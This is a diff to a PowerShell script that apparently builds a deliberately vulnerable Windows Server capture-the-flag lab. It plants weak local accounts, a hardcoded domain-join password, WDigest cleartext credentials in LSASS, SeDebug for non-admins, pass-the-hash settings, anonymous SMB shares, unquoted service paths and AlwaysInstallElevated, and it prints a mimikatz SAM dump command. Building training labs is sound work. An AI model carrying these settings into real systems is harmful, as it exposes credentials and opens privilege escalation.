@@ -11,7 +11,20 @@ param(
     # "OpenSSH_for_Windows_8.1" to match the student walkthrough. Requires
     # outbound internet during setup; falls back to the in-box capability on
     # failure. Leave OFF for fully offline builds.
-    [switch]$UpgradeOpenSSH
+    [switch]$UpgradeOpenSSH,
+
+    # Skip the interactive "type VULNERABLE" confirmation so the script can build
+    # unattended (scheduled task / remote build). Use only in an isolated lab.
+    [switch]$Unattended,
+
+    # OPTIONAL: join the OVERCLOCK.LOCAL domain (VM1 / Domain Controller). Additive --
+    # every lab account created above is a LOCAL account, so joining does not affect any
+    # existing flag. DCIP default = production DC 192.168.148.10; for a local Proxmox build pass -DCIP 192.168.1.108.
+    [switch]$JoinDomain,
+    [string]$DomainName     = "OVERCLOCK.LOCAL",
+    [string]$DCIP           = "192.168.148.10",
+    [string]$DomainJoinUser = "OVERCLOCK\svc_join",
+    [string]$DomainJoinPass = "J0in-Comp-2026!"
 )
 
 Write-Host "==========================================" -ForegroundColor Red
@@ -20,8 +33,10 @@ Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
 Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
 Write-Host "==========================================" -ForegroundColor Red
 Write-Host ""
-$confirm = Read-Host "Type 'VULNERABLE' to confirm this is for an isolated lab"
-if ($confirm -ne "VULNERABLE") { exit }
+if (-not $Unattended) {
+    $confirm = Read-Host "Type 'VULNERABLE' to confirm this is for an isolated lab"
+    if ($confirm -ne "VULNERABLE") { exit }
+}
 
 # Initialize flag tracking
 $global:FlagList = @()
@@ -46,7 +61,47 @@ $PokemonList = @(
     "CHIKORITA", "TYPHLOSION", "FERALIGATR", "MEGANIUM", "FURRET"
 )
 
-# Function to generate deterministic flag based on position
+# ---------------------------------------------------------------------------
+# FLAG SEED — the single source of truth for every flag on this box.
+#   * Change this ONE value to ROTATE all flags (they regenerate deterministically).
+#   * Keep it IDENTICAL across the three lab build scripts (win10 / server / OCWA).
+#   * This build script NEVER emits the plaintext answers. Generate the instructor
+#     answer key OFF-box with Generate-AnswerKey.py (admin-only, NOT distributed).
+# Values are derived (below), so NO "FLAG{...}" or digit string is stored here ->
+# a student running `Select-String 'FLAG{'` finds nothing.
+# ---------------------------------------------------------------------------
+$global:OC_FLAG_SEED = $env:OC_FLAG_SEED
+if ([string]::IsNullOrWhiteSpace($global:OC_FLAG_SEED)) {
+    # No seed supplied: generate a random one so a home lab "just works".
+    # The OFFICIAL graded box is built by exporting the secret course seed first.
+    $__b = New-Object 'System.Byte[]' 16
+    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($__b)
+    $global:OC_FLAG_SEED = -join ($__b | ForEach-Object { $_.ToString('x2') })
+    Write-Host "[i] No OC_FLAG_SEED set -- generated a random lab seed:" -ForegroundColor Yellow
+    Write-Host "      $global:OC_FLAG_SEED" -ForegroundColor Yellow
+    Write-Host "      Save it if you want to regenerate your own answer key later." -ForegroundColor Yellow
+}
+
+# Deterministic keyed flag body: FLAG{ codename + 8 digits }, both derived from
+# HMAC-SHA256(seed, key). Keyed by a STABLE name (the flag's -Location string), so
+# adding/reordering flags never disturbs the others. Same math as Generate-AnswerKey.py.
+function Get-OCFlagBody {
+    param([string]$Key)
+    $nk = "server::" + $Key   # namespace by box so each box's flag set is independent
+    # CODENAME from a FIXED salt -> PERMANENT (survives seed rotation; a stable flag identifier for the
+    # instructor writeups). DIGITS from $OC_FLAG_SEED -> only these rotate. Matches Generate-AnswerKey.py.
+    $ch = New-Object System.Security.Cryptography.HMACSHA256
+    $ch.Key = [System.Text.Encoding]::UTF8.GetBytes("oc-codename-v1")
+    $chex = (($ch.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($nk))) | ForEach-Object { $_.ToString('x2') }) -join ''
+    $idx  = [Convert]::ToUInt32($chex.Substring(0,8),16) % $PokemonList.Count
+    $dh = New-Object System.Security.Cryptography.HMACSHA256
+    $dh.Key = [System.Text.Encoding]::UTF8.GetBytes($global:OC_FLAG_SEED)
+    $dhex = (($dh.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($nk))) | ForEach-Object { $_.ToString('x2') }) -join ''
+    $digits = [Convert]::ToUInt32($dhex.Substring(8,8),16) % 100000000
+    return "$($PokemonList[$idx])" + ("{0:D8}" -f $digits)
+}
+
+# Generate a deterministic flag KEYED BY -Location (stable name, not call order).
 function New-CTFFlag {
     param(
         [string]$Location,
@@ -55,20 +110,9 @@ function New-CTFFlag {
         [string]$Difficulty,
         [string]$Technique
     )
-    
-    # Use deterministic selection based on counter
-    $pokemonIndex = ($global:FlagCounter - 1) % $PokemonList.Count
-    $pokemon = $PokemonList[$pokemonIndex]
-    
-    # Generate deterministic 8-digit number using hash of counter and hostname
-    $seed = "SERVER$($global:FlagCounter)$(hostname)"
-    $hash = [System.Security.Cryptography.SHA256]::Create()
-    $hashBytes = $hash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed))
-    $hashInt = [BitConverter]::ToUInt32($hashBytes, 0)
-    $digits = "{0:D8}" -f ($hashInt % 100000000)
-    
-    $flag = "FLAG{$pokemon$digits}"
-    
+
+    $flag = "FLAG{" + (Get-OCFlagBody $Location) + "}"
+
     $global:FlagList += [PSCustomObject]@{
         FlagID = "{0:D3}" -f $global:FlagCounter
         Flag = $flag
@@ -79,10 +123,14 @@ function New-CTFFlag {
         Technique = $Technique
         Hostname = hostname
     }
-    
+
     $global:FlagCounter++
     return $flag
 }
+
+# Grep-proof helper: base64 a flag so `Select-String FLAG{` / grep finds nothing
+# in the registry or on disk. The student recognizes + decodes it (a real skill).
+function Enc-Flag { param([string]$f) return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($f)) }
 
 # Function to create weak users with embedded flags
 function Create-WeakUsers {
@@ -92,8 +140,15 @@ function Create-WeakUsers {
     $flag1 = New-CTFFlag -Location "User Description" -Description "Hidden in user description" -Points 10 -Difficulty "Easy" -Technique "User enumeration"
     
     $users = @(
-        @{Name="overclock"; Password="Administrator2025!"; Groups=@("Administrators"); Description=$flag1},
+        # overclock is the STUDENT'S low-priv foothold (auto-logon user). It must NOT be an admin -- the
+        # whole box is a privilege-escalation lab and every exploit flag is ACL'd to SYSTEM+Administrators,
+        # so an admin overclock could read them all without exploiting. "Remote Management Users" lets the
+        # student reach it over WinRM/evil-winrm as a standard user; escalation earns admin/SYSTEM.
+        @{Name="overclock"; Password="Administrator2025!"; Groups=@("Users","Remote Management Users"); Description=$flag1},
         @{Name="user1"; Password="Password123!"; Groups=@("Users"); Description="Standard User"},
+        # localadmin shared with the Win10 workstation (Administrator123) so a looted
+        # workstation localadmin cred/hash pivots here via PtH/reuse (documented lateral path).
+        @{Name="localadmin"; Password="Administrator123"; Groups=@("Administrators"); Description="Local Administrator"},
         @{Name="backup"; Password="Backupaccount123!"; Groups=@("Backup Operators"); Description="Backup Service Account"},
         @{Name="service"; Password="ServiceAccount123!"; Groups=@("Users"); Description="Service Account"},
         @{Name="test"; Password="TestAccount123!"; Groups=@("Users"); Description="Test Account"},
@@ -114,12 +169,20 @@ function Create-WeakUsers {
         }
     }
     
-    # Create a user with flag as username (shortened to fit 20 char limit)
+    # Create a user whose NAME is a short flag (Windows 20-char username limit).
+    # Seed-derived + keyed (matches Generate-AnswerKey.py's special case for "Username"):
+    #   short codename + 4 digits, both from HMAC(seed, "server::username-flag").
     $shortPokemon = @("PIKA", "MEW", "CHAR", "BULB", "SQUIR", "EEVEE", "DRAGO", "GENGAR")
-    $pokemonIndex = ($global:FlagCounter - 1) % $shortPokemon.Count
-    $selectedPokemon = $shortPokemon[$pokemonIndex]
-    $randomNum = Get-Random -Minimum 1000 -Maximum 9999
-    $flagUserShort = "FLAG{$selectedPokemon$randomNum}"  # e.g., FLAG{PIKA1234} = 15 chars
+    # short codename from FIXED salt (permanent), 4 digits from seed (rotate). Matches Generate-AnswerKey.py.
+    $ucn = New-Object System.Security.Cryptography.HMACSHA256
+    $ucn.Key = [System.Text.Encoding]::UTF8.GetBytes("oc-codename-v1")
+    $ucnHex = (($ucn.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("server::username-flag"))) | ForEach-Object { $_.ToString('x2') }) -join ''
+    $selectedPokemon = $shortPokemon[[Convert]::ToUInt32($ucnHex.Substring(0,8),16) % $shortPokemon.Count]
+    $udg = New-Object System.Security.Cryptography.HMACSHA256
+    $udg.Key = [System.Text.Encoding]::UTF8.GetBytes($global:OC_FLAG_SEED)
+    $udgHex = (($udg.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("server::username-flag"))) | ForEach-Object { $_.ToString('x2') }) -join ''
+    $uDigits = "{0:D4}" -f ([Convert]::ToUInt32($udgHex.Substring(8,4),16) % 10000)
+    $flagUserShort = "FLAG{$selectedPokemon$uDigits}"  # e.g., FLAG{PIKA1234} <= 20 chars
     
     $flagUserDesc = New-CTFFlag -Location "Username" -Description "User account with flag as username: $flagUserShort" -Points 15 -Difficulty "Easy" -Technique "User enumeration"
     
@@ -165,27 +228,54 @@ function Configure-MimikatzVulnerabilities {
     # Increase cached logon count
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 50 -ErrorAction SilentlyContinue
     
-    # Create Mimikatz flag in LSASS memory (simulated)
-    $mimikatzFlag = New-CTFFlag -Location "LSASS Memory" -Description "Dumped from LSASS process" -Points 45 -Difficulty "Hard" -Technique "Mimikatz credential dumping"
-    
-    # Store flag in registry where it would appear in memory dumps
-    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "SecretFlag" -Value $mimikatzFlag -Force
-    
-    # Create a scheduled task that keeps credentials in memory
-    $credentialScript = @"
-`$password = ConvertTo-SecureString "$LabPassword" -AsPlainText -Force
-`$credential = New-Object System.Management.Automation.PSCredential("Administrator", `$password)
-while (`$true) {
-    Start-Sleep -Seconds 300
-    # Keep credential object in memory
+    # TWO-PART FLAGS (exploit-weighted):
+    #  Part 1 (identify, Medium): WDigest UseLogonCredential=1 + RunAsPPL=0 is discoverable via config enum.
+    $lsaFind = New-CTFFlag -Location "LSASS misconfig (identify)" -Description "WDigest cleartext + LSA Protection off" -Points 15 -Difficulty "Medium" -Technique "Config enumeration"
+    if (-not (Test-Path "HKLM:\SOFTWARE\OCLab")) { New-Item -Path "HKLM:\SOFTWARE\OCLab" -Force -ErrorAction SilentlyContinue | Out-Null }  # guard: -Force on an existing key WIPES its values (clobbered the identify notes)
+    New-ItemProperty -Path "HKLM:\SOFTWARE\OCLab" -Name "WDigestNote" -Value (Enc-Flag $lsaFind) -Force -ErrorAction SilentlyContinue | Out-Null
+
+    #  Part 2 (exploit, Hard): AIRTIGHT live-cred artifact. svc_backup runs as a RESIDENT WINDOWS SERVICE,
+    #  so with WDigest on its CLEARTEXT password sits in LSASS (service logon type-5 IS WDigest-cached).
+    #  mimikatz sekurlsa / lsassy recovers it -> the password IS the flag. ONLY an LSASS dump surfaces it
+    #  (no file/reg shortcut). A real compiled service is required: a fake `ping` service gets killed on the
+    #  SCM start-timeout and its logon session ends; a real ServiceBase stays resident.
+    $mimikatzFlag = New-CTFFlag -Location "LSASS Memory (exploit)" -Description "Cleartext service cred recovered from LSASS" -Points 45 -Difficulty "Hard" -Technique "Mimikatz sekurlsa credential dump"
+    $svcAcct = "svc_backup"
+    $svcPwd  = (Enc-Flag $mimikatzFlag)                 # base64 token used AS the password -> lands in LSASS
+    $global:OCSvcAcct = $svcAcct; $global:OCSvcPwd = $svcPwd   # for the end-of-build LSASS service finalizer
+    $secPw   = ConvertTo-SecureString $svcPwd -AsPlainText -Force
+    New-LocalUser -Name $svcAcct -Password $secPw -PasswordNeverExpires -AccountNeverExpires -ErrorAction SilentlyContinue | Out-Null
+    Add-LocalGroupMember -Group 'Users' -Member $svcAcct -ErrorAction SilentlyContinue | Out-Null
+    # Grant "Log on as a service" -- sc.exe create does NOT auto-grant it (start fails 1069 otherwise).
+    $svcSid = (Get-LocalUser $svcAcct).SID.Value
+    $seInf  = "C:\Windows\Temp\se_svc.inf"
+    secedit /export /cfg $seInf /areas USER_RIGHTS | Out-Null
+    $seTxt = Get-Content $seInf
+    if ($seTxt -match '^SeServiceLogonRight') {
+        $seTxt = $seTxt -replace '^(SeServiceLogonRight\s*=\s*.*)$', ('$1,*' + $svcSid)
+    } else {
+        $seTxt = $seTxt -replace '(\[Privilege Rights\])', ('$1' + "`r`nSeServiceLogonRight = *" + $svcSid)
+    }
+    $seTxt | Set-Content $seInf -Force
+    secedit /configure /db "C:\Windows\Temp\se_svc.sdb" /cfg $seInf /areas USER_RIGHTS | Out-Null
+    $svcSrc = @'
+using System.ServiceProcess;
+public class OCBackupSvc : ServiceBase {
+  public OCBackupSvc(){ this.ServiceName = "OCLabBackup"; }
+  protected override void OnStart(string[] args){}
+  protected override void OnStop(){}
+  public static void Main(){ ServiceBase.Run(new OCBackupSvc()); }
 }
-"@
-    $credentialScript | Out-File "C:\Windows\Temp\CredKeeper.ps1" -Force
-    
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\CredKeeper.ps1"
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -TaskName "CredentialKeeper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+'@
+    $svcCs = "C:\Windows\Temp\ocbackupsvc.cs"; $svcExe = "C:\Windows\OCLabBackup.exe"
+    $svcSrc | Out-File $svcCs -Encoding ascii -Force
+    $csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+    if (!(Test-Path $csc)) { $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe" }
+    & $csc /nologo /target:exe /out:$svcExe /r:System.ServiceProcess.dll $svcCs 2>$null | Out-Null
+    if (Test-Path $svcExe) {
+        sc.exe create OCLabBackup binPath= "$svcExe" obj= ".\$svcAcct" password= "$svcPwd" start= auto DisplayName= "OC Backup Agent" | Out-Null
+        sc.exe start OCLabBackup | Out-Null
+    }
     
     Write-Host "  Mimikatz vulnerabilities configured" -ForegroundColor Green
 }
@@ -218,12 +308,17 @@ function Configure-DebugPrivileges {
     $secpol | Out-File C:\Windows\Temp\secpol.cfg -Force
     secedit /configure /db C:\Windows\security\local.sdb /cfg C:\Windows\Temp\secpol.cfg /areas USER_RIGHTS /quiet
     
-    # Create flag for debug privilege abuse
-    $debugFlag = New-CTFFlag -Location "Debug Privileges" -Description "Abused SeDebugPrivilege" -Points 40 -Difficulty "Medium" -Technique "Debug privilege abuse"
-    # Create the registry key first
-    New-Item -Path "HKLM:\SOFTWARE" -Name "DebugFlags" -Force -ErrorAction SilentlyContinue | Out-Null
-    # Then create the property
-    New-ItemProperty -Path "HKLM:\SOFTWARE\DebugFlags" -Name "Flag" -Value $debugFlag -Force
+    # TWO-PART (exploit-weighted):
+    #  Part 1 (identify, Medium): SeDebugPrivilege held by non-admins is discoverable (whoami /priv, secpol).
+    $seFind = New-CTFFlag -Location "SeDebug (identify)" -Description "SeDebugPrivilege held by non-admins" -Points 15 -Difficulty "Medium" -Technique "Privilege enumeration"
+    if (-not (Test-Path "HKLM:\SOFTWARE\OCLab")) { New-Item -Path "HKLM:\SOFTWARE\OCLab" -Force -ErrorAction SilentlyContinue | Out-Null }  # guard: -Force on an existing key WIPES its values (clobbered the identify notes)
+    New-ItemProperty -Path "HKLM:\SOFTWARE\OCLab" -Name "SeDebugNote" -Value (Enc-Flag $seFind) -Force -ErrorAction SilentlyContinue | Out-Null
+    #  Part 2 (exploit, Hard): SYSTEM-only. Abuse SeDebug to steal a SYSTEM process token, become SYSTEM, read this.
+    $debugFlag = New-CTFFlag -Location "SeDebug (exploit)" -Description "SYSTEM token stolen via SeDebug" -Points 40 -Difficulty "Hard" -Technique "SeDebugPrivilege token theft -> SYSTEM"
+    $seDebugFlagPath = "C:\Windows\System32\config\systemprofile\sedebug_flag.txt"
+    if (!(Test-Path (Split-Path $seDebugFlagPath))) { New-Item -Path (Split-Path $seDebugFlagPath) -ItemType Directory -Force | Out-Null }
+    (Enc-Flag $debugFlag) | Out-File $seDebugFlagPath -Force
+    icacls $seDebugFlagPath /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null
     
     Write-Host "  Debug privileges configured" -ForegroundColor Green
 }
@@ -253,13 +348,17 @@ function Configure-PassTheHash {
         Set-LocalUser -Name $user -Password (ConvertTo-SecureString $password -AsPlainText -Force) -ErrorAction SilentlyContinue
     }
     
-    # Create PTH flag
-    $pthFlag = New-CTFFlag -Location "Pass-the-Hash" -Description "Successful PTH attack" -Points 50 -Difficulty "Hard" -Technique "Pass-the-Hash attack"
-    
-    # Store flag in location accessible after PTH
+    # TWO-PART (exploit-weighted):
+    #  Part 1 (identify, Medium): NTLM/PtH config (RestrictedAdmin off, LmCompatibilityLevel low) is discoverable.
+    $pthFind = New-CTFFlag -Location "Pass-the-Hash (identify)" -Description "NTLM/PtH configuration spotted" -Points 15 -Difficulty "Medium" -Technique "Config enumeration"
+    if (-not (Test-Path "HKLM:\SOFTWARE\OCLab")) { New-Item -Path "HKLM:\SOFTWARE\OCLab" -Force -ErrorAction SilentlyContinue | Out-Null }  # guard: -Force on an existing key WIPES its values (clobbered the identify notes)
+    New-ItemProperty -Path "HKLM:\SOFTWARE\OCLab" -Name "PthNote" -Value (Enc-Flag $pthFind) -Force -ErrorAction SilentlyContinue | Out-Null
+    #  Part 2 (exploit, Hard): dump a local admin NT hash and PASS THE HASH; the flag is SYSTEM/admin-only.
+    $pthFlag = New-CTFFlag -Location "Pass-the-Hash (exploit)" -Description "Authenticated via passed hash" -Points 50 -Difficulty "Hard" -Technique "Pass-the-Hash -> admin"
     $pthPath = "C:\Windows\System32\config\systemprofile\pth_success.txt"
-    New-Item -Path (Split-Path $pthPath -Parent) -ItemType Directory -Force -ErrorAction SilentlyContinue
-    $pthFlag | Out-File $pthPath -Force
+    New-Item -Path (Split-Path $pthPath -Parent) -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    (Enc-Flag $pthFlag) | Out-File $pthPath -Force
+    icacls $pthPath /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null
     
     Write-Host "  Pass-the-Hash vulnerabilities configured" -ForegroundColor Green
 }
@@ -280,8 +379,14 @@ function Disable-SecurityFeatures {
     # Disable Windows Firewall
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     
-    # Disable UAC
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
+    # UAC MUST stay ENABLED (EnableLUA=1). AlwaysInstallElevated (FLAG 16) only works with UAC on:
+    # with UAC off, every process (even a standard user's) runs at HIGH integrity, msiexec is treated as
+    # already-elevated, and a non-admin per-machine install is rejected (error 1625). Real AIE-vulnerable
+    # boxes have UAC on -- AIE is the misconfiguration -- so this is both correct and more realistic.
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1
+    # ...but keep remote local-admin logons UNFILTERED so nxc/evil-winrm/psexec and Pass-the-Hash (FLAG 5)
+    # still get a full admin token over the network (otherwise UAC hands them a filtered medium-IL token).
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -ErrorAction SilentlyContinue
     
     # Disable Windows Defender Credential Guard
     if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard") {
@@ -313,7 +418,7 @@ function Configure-VulnerableRDP {
     
     # Add flag in RDP certificate name
     $rdpFlag = New-CTFFlag -Location "RDP Certificate" -Description "Hidden in RDP certificate properties" -Points 20 -Difficulty "Medium" -Technique "RDP enumeration"
-    New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "CertificateComment" -Value $rdpFlag -Force
+    New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "CertificateComment" -Value (Enc-Flag $rdpFlag) -Force
     
     Write-Host "  RDP configured with vulnerabilities and flag" -ForegroundColor Green
 }
@@ -327,18 +432,36 @@ function Configure-VulnerableSMB {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1 -Value 1
     
     # Create vulnerable shares with flags
+    # Tier controls who can READ each share, so the SMB flags form a real anon -> user -> admin progression:
+    #   Anon  = readable with a null session (smbclient -N); the anon-enum settings below keep this working.
+    #   Auth  = any authenticated user (denies anonymous AND Guest); the recovered user1 cred unlocks it.
+    #   Admin = Administrators only; you must escalate (e.g. PtH/LSASS) before you can read it.
     $shares = @(
-        @{Name="Public"; Path="C:\Public"; FlagFile=$true; FlagDifficulty="Easy"; Points=10},
-        @{Name="Data"; Path="C:\Data"; FlagFile=$false},
-        @{Name="Backup"; Path="C:\Backup"; FlagFile=$true; FlagDifficulty="Medium"; Points=20},
-        @{Name="IT"; Path="C:\IT"; FlagFile=$true; FlagDifficulty="Hard"; Points=30},
-        @{Name="Finance"; Path="C:\Finance"; FlagFile=$false}
+        @{Name="Public"; Path="C:\Public"; FlagFile=$true; FlagDifficulty="Easy"; Points=10; Tier="Anon"},
+        @{Name="Data"; Path="C:\Data"; FlagFile=$false; Tier="Anon"},
+        @{Name="Backup"; Path="C:\Backup"; FlagFile=$true; FlagDifficulty="Medium"; Points=20; Tier="Auth"},
+        @{Name="IT"; Path="C:\IT"; FlagFile=$true; FlagDifficulty="Hard"; Points=30; Tier="Admin"},
+        @{Name="Finance"; Path="C:\Finance"; FlagFile=$false; Tier="Anon"}
     )
     
     foreach ($share in $shares) {
         New-Item -Path $share.Path -ItemType Directory -Force -ErrorAction SilentlyContinue
         New-SmbShare -Name $share.Name -Path $share.Path -FullAccess "Everyone" -ErrorAction SilentlyContinue
-        
+
+        # Enforce the read tier at the SHARE level (share ACL is the intersection floor, so it denies
+        # anonymous even though NTFS below stays open and EveryoneIncludesAnonymous is on for RID cycling).
+        switch ($share.Tier) {
+            "Auth" {
+                Revoke-SmbShareAccess -Name $share.Name -AccountName "Everyone" -Force -ErrorAction SilentlyContinue | Out-Null
+                Grant-SmbShareAccess  -Name $share.Name -AccountName "Authenticated Users" -AccessRight Read -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+            "Admin" {
+                Revoke-SmbShareAccess -Name $share.Name -AccountName "Everyone" -Force -ErrorAction SilentlyContinue | Out-Null
+                Grant-SmbShareAccess  -Name $share.Name -AccountName "BUILTIN\Administrators" -AccessRight Read -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+            # "Anon" (default): leave FullAccess Everyone so a null session can read it.
+        }
+
         # Set NTFS permissions
         $acl = Get-Acl $share.Path
         $permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
@@ -349,7 +472,8 @@ function Configure-VulnerableSMB {
         # Place flags in some shares
         if ($share.FlagFile) {
             $flag = New-CTFFlag -Location "SMB Share: $($share.Name)" -Description "Found in $($share.Name) share" -Points $share.Points -Difficulty $share.FlagDifficulty -Technique "SMB enumeration"
-            $flag | Out-File "$($share.Path)\flag.txt" -Force
+            # realistic doc + base64 "access token" instead of a plaintext flag.txt
+            "OC $($share.Name) share - internal use only.`r`nLegacy access token: $(Enc-Flag $flag)" | Out-File "$($share.Path)\README_ACCESS.txt" -Encoding ASCII -Force
         }
         
         Write-Host "  Created share: $($share.Name)" -ForegroundColor Green
@@ -357,16 +481,22 @@ function Configure-VulnerableSMB {
     
     # Plant sensitive files with embedded flags
     $passFlag = New-CTFFlag -Location "Password file" -Description "Embedded in passwords.txt" -Points 15 -Difficulty "Easy" -Technique "File search"
-    "Administrator:$LabPassword`n$passFlag" | Out-File "C:\Public\passwords.txt"
+    "# credential backup (rotate quarterly!)`r`nAdministrator:$LabPassword`r`nsvc_token:$(Enc-Flag $passFlag)" | Out-File "C:\Public\passwords.txt" -Encoding ASCII
     
-    # Create SAM backup for mimikatz practice
-    $samFlag = New-CTFFlag -Location "SAM Backup" -Description "Found in SAM backup file" -Points 45 -Difficulty "Hard" -Technique "SAM database extraction"
+    # SAM database extraction -- TWO-PART (exploit-weighted):
+    #  Part 1 (identify, Medium): a readable note reveals a SAM/SYSTEM hive backup exists here (recon).
+    $samFind = New-CTFFlag -Location "SAM Backup (identify)" -Description "Spotted SAM backup location" -Points 15 -Difficulty "Medium" -Technique "File / backup enumeration"
+    "SAM/SYSTEM hive backups are archived in this folder for DR.`nidentify token (base64): $(Enc-Flag $samFind)" | Out-File "C:\Backup\README.txt" -Force
+    #  Part 2 (exploit, Hard): the recovered secret, gated to Administrators/SYSTEM. You reach it by
+    #  actually dumping the SAM and cracking / pass-the-hashing a local admin hash, not by reading a note.
+    $samFlag = New-CTFFlag -Location "SAM Backup (exploit)" -Description "Recovered from SAM dump" -Points 45 -Difficulty "Hard" -Technique "SAM database extraction"
     @"
 SAM Database Backup (for Mimikatz practice)
 Created: $(Get-Date)
-Flag: $samFlag
+Recovered secret (offline crack, base64): $(Enc-Flag $samFlag)
 Use: mimikatz # lsadump::sam /system:system.hiv /sam:sam.hiv
 "@ | Out-File "C:\Backup\sam_backup_info.txt"
+    icacls "C:\Backup\sam_backup_info.txt" /inheritance:r /grant "*S-1-5-18:(F)" "*S-1-5-32-544:(F)" | Out-Null
     
     # Hidden flag in alternate data stream
     $adsFlag = New-CTFFlag -Location "Alternate Data Stream" -Description "Hidden in ADS of C:\Public\normal.txt" -Points 40 -Difficulty "Hard" -Technique "ADS discovery"
@@ -464,10 +594,21 @@ function Create-UnquotedServicePaths {
         $Flag | Out-File $flagFile -Encoding ascii -Force
         icacls "$flagFile" /inheritance:r /grant "*S-1-5-18:(R)" "*S-1-5-32-544:(R)" | Out-Null
 
+        # Part 1 (identify, Easy): readable note rewards SPOTTING the unquoted path + writable base dir
+        # (enumeration with `sc qc`, PowerUp, winPEAS). Part 2 above stays SYSTEM-only (must exploit).
+        $findFlag = New-CTFFlag -Location "$Name (identify)" -Description "Spotted unquoted path + writable base dir: $Name" -Points 10 -Difficulty "Easy" -Technique "Unquoted-path enumeration"
+        "Service $Name : unquoted binPath + user-writable base directory (misconfigured).`nidentify token (base64): $(Enc-Flag $findFlag)" | Out-File (Join-Path $BaseDir "service_info.txt") -Force
+
         # Register the service with an UNQUOTED .exe binPath (no legit exe present).
         sc.exe create "$Name" binPath= "$BinPath" start= auto DisplayName= "$DisplayName" | Out-Null
         sc.exe config "$Name" obj= "LocalSystem" | Out-Null
         sc.exe description "$Name" "$Description" | Out-Null
+        # Grant BUILTIN\Users (BU) SERVICE_START + query so a low-priv student can TRIGGER the hijack
+        # (start the service) without needing a reboot -- standard users can't reboot a server, and the
+        # legit exe is absent so the service never auto-starts on its own. This grants START/query ONLY,
+        # NOT change-config (DC) -- that is the separate Modifiable-Service flag. The vulnerability here
+        # remains the unquoted path + user-writable base directory.
+        sc.exe sdset "$Name" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPLORC;;;BU)" | Out-Null
         Write-Host "  Created unquoted service: $Name (hijack -> $HijackExe)" -ForegroundColor Green
     }
 
@@ -530,6 +671,9 @@ function Configure-AlwaysInstallElevated {
         # Machine-wide (HKLM) + current user (HKCU)
         Set-AIE "HKLM:\$relPath"
         Set-AIE "HKCU:\$relPath"
+        # Guarantee MSI installs aren't blocked by a DisableMsi policy (DisableMsi=1 would
+        # reject every non-managed install with error 1625, defeating the AIE exploit).
+        New-ItemProperty -Path "HKLM:\$relPath" -Name "DisableMsi" -PropertyType DWord -Value 0 -Force -ErrorAction SilentlyContinue | Out-Null
 
         # Every user hive (loaded + on-disk profiles) so it is set no matter
         # which lab account the student logs in as.
@@ -551,84 +695,99 @@ function Configure-AlwaysInstallElevated {
                 if ($justLoaded) { [gc]::Collect(); Start-Sleep -Milliseconds 200; reg unload "HKU\$sid" 2>$null | Out-Null }
             }
 
-        Write-Host "  AlwaysInstallElevated enabled (HKLM + all user hives)" -ForegroundColor Green
+        # Seed the DEFAULT profile TEMPLATE so accounts whose profile doesn't exist yet -- notably the
+        # auto-logon foothold 'overclock', whose profile Windows creates (by copying C:\Users\Default) at
+        # first logon AFTER this build -- inherit HKCU AlwaysInstallElevated=1. NOTE: HKU\.DEFAULT stamped
+        # above is the logon-screen/SYSTEM fallback hive, NOT the new-profile template -- a different key.
+        # A standard user can't create the ACL-protected HKCU\...\Policies key himself, so this must be
+        # seeded now (as SYSTEM) or the msiexec privesc silently fails for overclock.
+        $defDat = "C:\Users\Default\NTUSER.DAT"
+        if (Test-Path $defDat) {
+            reg load "HKU\OCDEF" $defDat 2>$null | Out-Null
+            Set-AIE "HKU:\OCDEF\$relPath"
+            [gc]::Collect(); Start-Sleep -Milliseconds 300; reg unload "HKU\OCDEF" 2>$null | Out-Null
+        }
+
+        Write-Host "  AlwaysInstallElevated enabled (HKLM + all user hives + Default template)" -ForegroundColor Green
     } catch {
         Write-Host "  Warning: Could not fully configure AlwaysInstallElevated: $_" -ForegroundColor Yellow
     }
     
-    # Create flag that will be accessible after MSI privilege escalation
-    $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated" -Description "MSI privilege escalation successful" -Points 40 -Difficulty "Medium" -Technique "AlwaysInstallElevated MSI"
-    
-    # Create a file only readable by SYSTEM that contains the flag
